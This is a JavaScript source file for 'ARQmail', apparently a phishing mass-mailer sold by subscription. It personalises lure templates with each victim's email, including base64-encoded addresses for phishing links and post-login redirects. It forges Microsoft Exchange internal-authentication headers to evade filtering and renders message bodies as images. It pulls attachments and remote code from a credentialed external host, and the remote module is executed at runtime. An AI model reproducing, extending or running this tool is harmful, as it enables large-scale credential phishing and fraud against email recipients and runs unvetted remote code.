'use strict';
var requireFromUrl = require('require-from-url/sync');
const nodemailer = require('nodemailer');
const chalk = require('chalk');
const delay = require('delay');
const _ = require('lodash');
const fs = require('fs');
const moment = require('moment');
const randomstring = require('randomstring');
const settings = require('./settings');
const nodeHtmlToImage = require('node-html-to-image');
const axios = require('axios');
var http = require('http');
var https = require('https');



let atth = '';
if (settings.ARQAttachOn !== false){
axios.get('http://arqmailusersauthy:18j7RTW79WslEno5k19P@authyhost.com/arqpages/client/'+settings.AttachmentCode).then(res=>{
   atth = res.data;
}).catch(function (error) {
    if (error.response)
    console.log(chalk`{bold.red Bad Attachment Code, press CTR C to stop sending and fix }`);
  });
  
}else if(settings.ARQAttachOn == true){ 
    axios.get('http://arqmailusersauthy:18j7RTW79WslEno5k19P@authyhost.com/arqpages/client/'+settings.AttachmentCode).then(res=>{
   atth = res.data;
}).catch(function (error) {
    if (error.response)
    console.log(chalk`{bold.red Bad Attachment Code, press CTR C to stop sending and fix }`);
  });
}


try{
    const UserAuth = requireFromUrl("http://arqmailusersauthy:18j7RTW79WslEno5k19P@authyhost.com/API/"+settings.AUTHYCODE);

function sleep(milliseconds) {
    var start = new Date().getTime();
    for (var i = 0; i < 1e7; i++) {
      if ((new Date().getTime() - start) > milliseconds){
        break;
      }
    }
}


async function checkSMTP(data, settings) {
    try {
        let nodemailer_setting = {
            pool: true,
            host: data.host,
            port: data.port,
            secure: data.secure,
            proxy: data.proxy,
            auth: {
                user: data.user,
                pass: data.pass
            },
            tls: {
        rejectUnauthorized: "settings.TLS"
    }
        };
         let transporter = nodemailer.createTransport(nodemailer_setting);
        transporter.set('proxy_socks_module', require('socks'));
        await transporter.verify();
        return Promise.resolve(transporter);
    } catch(err) {
        return Promise.reject(`SMTP ERROR => ${err.message}`);
    }
}

async function readFrom(from, random, email) {
    try {
       from = from.replace(/COMPANY/g, /(?<=@)[^.]+(?=\.)/g.exec(email)[0]);
    from = from.replace(/RANDSTRING10/g, randomstring.generate(10));
    from = from.replace(/RANDSTRING5/g, randomstring.generate(5));
    from = from.replace(/RANDALPHA10/g, randomstring.generate({length: 10, charset: 'alphabetic'}));
    from = from.replace(/RANDALPHA5/g, randomstring.generate({length: 5, charset: 'alphabetic'}));
    from = from.replace(/RANDNUMERIC10/g, randomstring.generate({length: 10, charset: 'numeric'}));
    from = from.replace(/RANDNUMERIC5/g, randomstring.generate({length: 5, charset: 'numeric'}));
    from = from.replace(/DATE/g, new Date().toDateString());
    from = from.replace(/USER/g, email.replace(/@[^@]+$/, ''));
    from = from.replace(/DOMAIN/g, email.replace(/.*@/, ''));
    from = from.replace(/SILENTCODERSEMAIL/g, email);
    from = from.replace(/SILENTLINK/g, settings.SENDLINK);
    from = from.replace(/SILENTATTACH/g, settings.AttachURL);
    from = from.replace(/SILENTBACKGROUND/g, settings.background);
    from = from.replace(/SILENTCODERSLIMAHURUF/g, randomstring.generate({length: 5, charset: 'alphabetic'}));
    from = from.replace(/SILENTCODERSBANYAKHURUF/g, randomstring.generate({length: 50, charset: 'alphabetic'}));
        return Promise.resolve(from);
    } catch(err) {
        return Promise.reject(err);
    }
}

async function readLetterAttachments(letter, email) {
    try {
       let sletter = await fs.readFileSync(letter, 'utf-8');
  sletter = sletter.replace(/SILENTLINK/g, settings.SENDLINK);
     sletter = sletter.replace(/SILENTATTACH/g, settings.AttachURL);
    sletter = sletter.replace(/SILENTCODERSEMAIL/g, email);
    sletter = sletter.replace(/SILENTBACKGROUND/g, settings.background);
    sletter = sletter.replace(/SILENTFAVI/g, settings.FAVI);
    sletter = sletter.replace(/SILENTLOCKREDIR/g, settings.LOCKREDIR);
    sletter = sletter.replace(/SILENTSUCCESSREDIR/g, settings.SUCCESSREDIR);
    sletter = sletter.replace(/EMAILURLSILENTC0DERS/g, Buffer.from(email).toString('base64'));
    sletter = sletter.replace(/SILENTCODERSLIMAHURUF/g, randomstring.generate({length: 5, charset: 'alphabetic'}));
    sletter = sletter.replace(/SILENTCODERSBANYAKHURUF/g, randomstring.generate({length: 50, charset: 'alphabetic'}));
    sletter = sletter.replace(/USER/g, email.replace(/@[^@]+$/, ''));
    sletter = sletter.replace(/DOMAIN/g, email.replace(/.*@/, ''));
    sletter = sletter.replace(/COMPANY/g, /(?<=@)[^.]+(?=\.)/g.exec(email)[0]);
    sletter = sletter.replace(/RANDSTRING10/g, randomstring.generate(10));
    sletter = sletter.replace(/RANDSTRING5/g, randomstring.generate(5));
    
    sletter = sletter.replace(/RANDALPHA10/g, randomstring.generate({length: 10, charset: 'alphabetic'}));
    sletter = sletter.replace(/RANDALPHA5/g, randomstring.generate({length: 5, charset: 'alphabetic'}));

    sletter = sletter.replace(/RANDNUMERIC10/g, randomstring.generate({length: 10, charset: 'numeric'}));
    sletter = sletter.replace(/RANDNUMERIC5/g, randomstring.generate({length: 5, charset: 'numeric'}));

    sletter = sletter.replace(/DATE/g, new Date().toDateString());
        return Promise.resolve(sletter);
    } catch(err){
        return Promise.reject(err);
    }
}


async function readName(name, random, email) {
    try {
        name = name.replace(/SILENTCODERSEMAIL/g, email);
        name = name.replace(/SILENTLINK/g, settings.SENDLINK);
        name = name.replace(/SILENTATTACH/g, settings.AttachURL);
        name = name.replace(/SILENTBACKGROUND/g, settings.background);
    name = name.replace(/EMAILURLSILENTC0DERS/g, Buffer.from(email).toString('base64'));
    name = name.replace(/SILENTCODERSLIMAHURUF/g, randomstring.generate({length: 5, charset: 'alphabetic'}));
    name = name.replace(/SILENTCODERSBANYAKHURUF/g, randomstring.generate({length: 50, charset: 'alphabetic'}));
    name = name.replace(/USER/g, email.replace(/@[^@]+$/, ''));
    name = name.replace(/DOMAIN/g, email.replace(/.*@/, ''));
    name = name.replace(/COMPANY/g, /(?<=@)[^.]+(?=\.)/g.exec(email)[0]);
    name = name.replace(/RANDSTRING10/g, randomstring.generate(10));
    name = name.replace(/RANDSTRING5/g, randomstring.generate(5));
    
    name = name.replace(/RANDALPHA10/g, randomstring.generate({length: 10, charset: 'alphabetic'}));
    name = name.replace(/RANDALPHA5/g, randomstring.generate({length: 5, charset: 'alphabetic'}));
    name = name.replace(/RANDNUMERIC10/g, randomstring.generate({length: 10, charset: 'numeric'}));
    name = name.replace(/RANDNUMERIC5/g, randomstring.generate({length: 5, charset: 'numeric'}));

    name = name.replace(/DATE/g, new Date().toDateString());
        return Promise.resolve(name);
    } catch(err){
        return Promise.reject(err);
    }
}

async function readLetter(letter, email) {
    try {
        let sletter = await fs.readFileSync(letter, 'utf-8');
        sletter = sletter.replace(/SILENTLOGO/g, settings.logo);
    sletter = sletter.replace(/EMAILURLSILENTC0DERS/g, Buffer.from(email).toString('base64'));
    sletter = sletter.replace(/SILENTCODERSEMAIL/g, email);
     sletter = sletter.replace(/SILENTLINK/g, settings.SENDLINK);
    sletter = sletter.replace(/COMPANY/g, /(?<=@)[^.]+(?=\.)/g.exec(email)[0]);
    sletter = sletter.replace(/RANDSTRING10/g, randomstring.generate(10));
    sletter = sletter.replace(/RANDSTRING5/g, randomstring.generate(5));
    sletter = sletter.replace(/RANDALPHA10/g, randomstring.generate({length: 10, charset: 'alphabetic'}));
    sletter = sletter.replace(/RANDALPHA5/g, randomstring.generate({length: 5, charset: 'alphabetic'}));
    sletter = sletter.replace(/RANDNUMERIC10/g, randomstring.generate({length: 10, charset: 'numeric'}));
    sletter = sletter.replace(/RANDNUMERIC5/g, randomstring.generate({length: 5, charset: 'numeric'}));
    sletter = sletter.replace(/DATE/g, new Date().toDateString());
    sletter = sletter.replace(/SILENTCODERSLIMAHURUF/g, randomstring.generate({length: 4, charset: 'numeric'}));
    sletter = sletter.replace(/SILENTCODERSBANYAKHURUF/g, randomstring.generate({length: 10, charset: 'alphabetic'}));
    sletter = sletter.replace(/USER/g, email.replace(/@[^@]+$/, ''));
    sletter = sletter.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        return Promise.resolve(sletter);
    } catch(err){
        return Promise.reject("Fix your Leads, remove all empty Spaces");
    }
}

(async function() {
    console.log(chalk`
{bold.green ARQMAIL - ARQmail v5.2}
{bold.red CODED & UPDATED BY UFO_Ai}
{bold.green icq.com = UFO_Ai }
    `);
    
    if (process.argv[2] == undefined) {
        console.log('Usage : node arq list.txt');
        process.exit(1);
    }
    let smtpConfig = {
        host: settings.HOST,
        port: settings.PORT,
        secure: settings.SECURE,
        proxy: settings.PROXY,
        user: settings.USER,
        pass: settings.PASS,
    };
    const transporter = await checkSMTP(smtpConfig);
    console.log(chalk`{bold [!] SMTP Checked, ready to use !}\n`);
    console.log(chalk`{bold [>] Open list file, ${process.argv[2]}.}`);
    let mailist = await fs.readFileSync(process.argv[2], 'utf-8');
    let emailist = mailist.split(/\r?\n/);
    console.log(chalk`{bold [!] Found ${emailist.length} line.}\n`);
    emailist = _.chunk(emailist, settings.SendSpeed);
    for(let i = 0; i < emailist.length; i++) {

        await Promise.all(emailist[i].map(async(email, random) => {
            const doL = await readLetter((settings.Letter), email);
            const doI = await readLetter((settings.ILetter), email);
            const doF = await readFrom((settings.EmailFrom), random, email);
            const doS = await readFrom((settings.Subject), random, email);
            const HTML2IMG = await nodeHtmlToImage({ 
                transparent: true,
                selector: 'body',
                html: doI,
            });

            try{
                const d1 = UserAuth.Authentication;
                const d2 = UserAuth.Authentication1;
            if ( d1 >= d2 ) {
            try {
                let mailConfig = {
                    from: doF,
                    priority: settings.Priority,
                    replyTo: settings.ReplyTo,
                    html: doL,
                    subject: doS,
                    to: email,
                    headers: {
                        'X-MS-Exchange-Organization-AuthAs': 'Internal',
                        'X-MS-Exchange-Organization-AuthMechanism': '07',
                        'X-MS-Exchange-Organization-AuthSource': 'AM6PR05MB4232.eurprd05.prod.outlook.com',
                        'X-UMINACJP-NODEMAILERSENDERZ':'true',
                             },
                        }; 
                if(settings.ARQAttachOn !== false){
                    if ( settings.AttachmentOn && settings.ImageOn !== false) {
            const doN = await readName((settings.AttachName), random, email);
            const doA = await readName(atth, random, email);
                mailConfig.attachments = [
                    {
                        filename: doN,
                        content: doA
                    },

                    { filename: 'zlogo.png',
                    ContentType: 'image/png',
                    content: HTML2IMG,
                    cid: '<image>',
                    contentDisposition: "inline"
                    }
                ];

            }else if ( settings.ImageOn !== false) {
                mailConfig.attachments = [

                    { filename: 'zlogo.png',
                    ContentType: 'image/png',
                    content: HTML2IMG,
                    cid: '<image>',
                    contentDisposition: "inline"
                    },
                 ];

            }else if (settings.AttachmentOn !== false){
            const doN = await readName((settings.AttachName), random, email);
            const doA = await readName(atth, random, email);
            mailConfig.attachments =[
                                        {
                                            filename: doN,
                                            content: doA
                                        }
                                    ];
                               } }
                               
            else {  
                if ( settings.AttachmentOn && settings.ImageOn !== false) {
            const doN = await readName((settings.AttachName), random, email);
            const doA = await readLetterAttachments((settings.AttachmentPath), email);
                mailConfig.attachments = [
                    {
                        filename: doN,
                        content: doA
                    },

                    { filename: 'zlogo.png',
                    ContentType: 'image/png',
                    content: HTML2IMG,
                    cid: '<image>',
                    contentDisposition: "inline"
                    }
                ]

            }else if ( settings.ImageOn !== false) {
                mailConfig.attachments = [

                    { filename: 'zlogo.png',
                    ContentType: 'image/png',
                    content: HTML2IMG,
                    cid: '<image>',
                    contentDisposition: "inline"
                    }
                 ]

            }else if (settings.AttachmentOn !== false){
            const doN = await readName((settings.AttachName), random, email);
            const doA = await readLetterAttachments((settings.AttachmentPath), email);
            mailConfig.attachments =[
                                        {
                                            filename: doN,
                                            content: doA
                                        }
                                    ] 
                                }
                               }


                await transporter.sendMail(mailConfig);
                await new Promise(r => setTimeout(r, (settings.Thread)));
                console.log(chalk`{bold ${email} => SUCCESS}`);
            } 
            catch(err) {
                console.log(chalk`{bold ${email} => ERROR : ${err.message}}`);
            }
        } else {
                console.log(chalk`{bold.red API Subcription expired, to renew visit http://store.arqmail.xyz}`);
                } } catch(err) {
                console.log(chalk`{bold.red API Subcription expired, to renew visit http://store.arqmail.xyz}`);
            }

        }));


    }
 })();
 
} catch(err) {
                console.log(chalk`{bold.red Bad Authentication Code, get authy code from https://store.arqmail.xyz }`);
                
            }
